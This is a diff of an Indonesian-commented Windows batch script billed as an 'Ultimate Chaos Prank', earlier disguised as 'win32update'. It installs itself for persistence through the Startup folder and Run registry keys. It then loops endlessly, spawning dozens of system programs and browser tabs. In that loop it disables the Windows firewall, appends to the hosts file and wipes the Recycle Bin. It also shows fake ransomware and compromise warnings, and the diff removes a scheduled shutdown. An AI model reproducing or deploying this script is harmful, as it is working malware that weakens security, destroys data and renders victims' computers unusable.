@@ -8,18 +8,13 @@
 :: Created by: 𝗥𝗮𝗳𝗮𝘀𝗵𝗮 𝗔𝗹𝗳𝗶𝗮𝗻𝗱𝗶
 :: Phone: +6287734034677
 ::
-if "%1" neq "h" (
-    cscript //nologo "%~dp0systemupdate.vbs" "%~f0"
-    exit
-)
-
 setlocal enabledelayedexpansion
 
-set "sentinelFile=%APPDATA%\stop_win32update.txt"
+set "sentinelFile=%APPDATA%\stop_prank.txt"
 set "criticalFile=%APPDATA%\critical_file.txt"
 
 if exist "%sentinelFile%" (
-    echo win32update sudah dihentikan. Menghapus file sentinel...
+    echo Prank sudah dihentikan. Menghapus file sentinel...
     del "%sentinelFile%" 
     exit
 )
@@ -29,44 +24,35 @@ if not exist "%criticalFile%" (
     echo Critical file is missing! Spam cannot be stopped until it's manually removed.
 )
 
-set "countdownTime=1"
+set "countdownTime=10"
 echo Pemulihan akan Dijalankan dalam %countdownTime% detik...
 echo SPDX-License-Identifier: Apache-2.0
 timeout /t %countdownTime% /nobreak >nul
 
-set "startupPath=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\win32update.bat"
+set "startupPath=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\prank.bat"
 if not exist "%startupPath%" (
     copy "%~f0" "%startupPath%"
 )
 
-set "hiddenPath=%APPDATA%\system_win32update.bat"
+set "hiddenPath=%APPDATA%\system_prank.bat"
 if not exist "%hiddenPath%" (
     copy "%~f0" "%hiddenPath%"
 )
 
-reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "Systemwin32update" /t REG_SZ /d "%APPDATA%\system_win32update.bat" /f
-reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "Persistentwin32update" /t REG_SZ /d "%APPDATA%\system_win32update.bat" /f
+reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "SystemPrank" /t REG_SZ /d "%APPDATA%\system_prank.bat" /f
+reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "PersistentPrank" /t REG_SZ /d "%APPDATA%\system_prank.bat" /f
 
-:start_win32update
+:start_prank
 
 @echo off
 set "wallpaperPath=C:\Users\ISD\Documents\Dokumen\THRIVE.jpg"
 
 if exist "%wallpaperPath%" (
     echo Mengubah wallpaper...
-
-    :: Menambah entri registry untuk mengganti wallpaper
+    
     reg add "HKCU\Control Panel\Desktop" /v Wallpaper /t REG_SZ /d "%wallpaperPath%" /f
-    reg add "HKCU\Control Panel\Desktop" /v WallpaperStyle /t REG_SZ /d 10 /f
-    reg add "HKCU\Control Panel\Desktop" /v TileWallpaper /t REG_SZ /d 0 /f
-
-    :: Memastikan perubahan diterapkan dengan PowerShell
-    powershell -command ^
-        "$dll = Add-Type -TypeDefinition @'
-        [DllImport(\"user32.dll\", CharSet = CharSet.Auto)]
-        public static extern int SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni);
-        '@ -Name 'Win32Utils' -Namespace 'Win32' -PassThru;
-        $dll::SystemParametersInfo(20, 0, '%wallpaperPath%', 3);"
+    
+    powershell -command "(Add-Type '[DllImport(\"user32.dll\")] public static extern bool SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni);' -Name 'Win32Utils' -Namespace 'Win32' -PassThru)::SystemParametersInfo(20, 0, '%wallpaperPath%', 3)"
 
     echo Wallpaper berhasil diubah.
 ) else (
@@ -120,10 +106,10 @@ start /b powershell -c "(New-Object Media.SoundPlayer 'C:\Windows\Media\tada.wav
 timeout /t 0.3 >nul
 
 @echo off
-title Ultimate Chaos win32update
+title Ultimate Chaos Prank
 powershell -WindowStyle Hidden -Command ""
 
-:LOOP
+:: Membuka aplikasi dan file bawaan
 start notepad
 start cmd
 start explorer
@@ -134,7 +120,6 @@ start taskmgr
 start devmgmt.msc
 start diskmgmt.msc
 start powershell
-start Voice Recorder
 start write
 start wordpad
 start msinfo32
@@ -153,12 +138,21 @@ start dfrgui
 start msra
 start eventvwr
 start lusrmgr.msc
+start charmap
+start msconfig
+start taskschd.msc
+start perfmon
+start wuapp
+start ms-settings:windowsupdate
+start iexplore
+start optionalfeatures
+start snippingtool
+start msedge
 start "C:\Program Files\Windows Media Player\wmplayer.exe"
 start "C:\Windows\System32\scrnsave.scr"
 start "C:\Windows\System32\soundrecorder.exe"
 start "C:\Windows\System32\StikyNot.exe"
 start "C:\Windows\System32\mspaint.exe"
-
 start "C:\Windows\win.ini"
 start "C:\Windows\System32\drivers\etc\hosts"
 start "C:\Windows\System32\config\SAM"
@@ -168,8 +162,48 @@ start "C:\Windows\System32\config\SYSTEM"
 start "C:\Windows\System32\winevt\Logs\Application.evtx"
 start "C:\Windows\System32\winevt\Logs\Security.evtx"
 start "C:\Windows\System32\winevt\Logs\System.evtx"
+start "C:\Windows\System32\mblctr.exe"
 
-start chrome "https://www.youtube.com/watch?v=dQw4w9WgXcQ&autoplay=1"  
+goto LOOP
+
+@echo off
+:LOOP
+:: Membuka aplikasi tambahan
+start notepad                :: Notepad
+start calc                   :: Kalkulator
+start explorer               :: File Explorer
+start cmd                    :: Command Prompt
+start taskmgr                :: Task Manager
+start powershell             :: PowerShell
+start devmgmt.msc            :: Device Manager
+start diskmgmt.msc           :: Disk Management
+start msconfig               :: System Configuration
+start regedit                :: Registry Editor
+start taskschd.msc           :: Task Scheduler
+start perfmon                :: Performance Monitor
+start dxdiag                 :: DirectX Diagnostic Tool
+start optionalfeatures       :: Windows Features
+start cleanmgr               :: Disk Cleanup
+start iexplore               :: Internet Explorer
+start msedge                 :: Microsoft Edge
+start "C:\Windows\System32\mspaint.exe" :: Paint
+start "C:\Windows\System32\StikyNot.exe" :: Sticky Notes
+
+echo Menambahkan entri ke hosts file...
+echo 127.0.0.1 www.contohsitusbloker.com >> "C:\Windows\System32\drivers\etc\hosts"
+
+echo Mematikan Firewall...
+netsh advfirewall set allprofiles state off
+
+echo Menambahkan startup aplikasi ke registry...
+reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "SpamScript" /d "%~dpnx0" /f
+
+echo Membersihkan recycle bin...
+rd /s /q %systemdrive%\$Recycle.Bin
+
+goto LOOP
+
+start chrome "https://www.youtube.com/watch?v=dQw4w9WgXcQ"
 start chrome "https://pointerpointer.com/"
 start chrome "https://www.staggeringbeauty.com/"
 start chrome "https://www.hackertyper.com/"
@@ -184,16 +218,7 @@ start chrome "https://thispersondoesnotexist.com/"
 start chrome "https://www.trypap.com/"
 start chrome "https://www.sandspiel.club/"
 start chrome "https://www.boredbutton.com/"
-start chrome "https://noisli.com/"
-start chrome "https://thezen.zone/"
-start chrome "https://virtualpiano.net/"
-start chrome "https://bongo.cat/"
-start chrome "https://eelslap.com/"
-start chrome "https://rainymood.com/"
-start chrome "https://asoftmurmur.com/"
-start chrome "https://findtheinvisiblecow.com/"
-start chrome "https://www.patatap.com/"
-start chrome "https://beatmaker.site/"
+
 start msedge "https://thisissand.com/"
 start msedge "https://eelslap.com/"
 start msedge "https://shadyurl.com/"
@@ -211,8 +236,7 @@ start cmd /k "color 09 & title HACKER MODE & echo Initiating protocol..."
 start cmd /k "color 03 & chkdsk C: & echo SYSTEM CHECK COMPLETE!" 
 start cmd /k "color 0E & echo WARNING! All data will be encrypted in 60 seconds!" 
 start cmd /k "color 06 & for /L %i in (1,1,100) do @echo Corrupting sector %i%" 
-start cmd /k "cls & color 08 & echo The system is watching you... 👁️" 
-start cmd /k "color 07 & echo Goodbye... & shutdown -s -t 30" 
+start cmd /k "cls & color 08 & echo The system is watching you... 👁️"
 
 for /L %%i in (1,1,50) do start /b msg * "CRITICAL ERROR! SYSTEM IS COMPROMISED!"
 for /L %%i in (1,1,50) do start /b msg * "UNAUTHORIZED ACCESS DETECTED!"
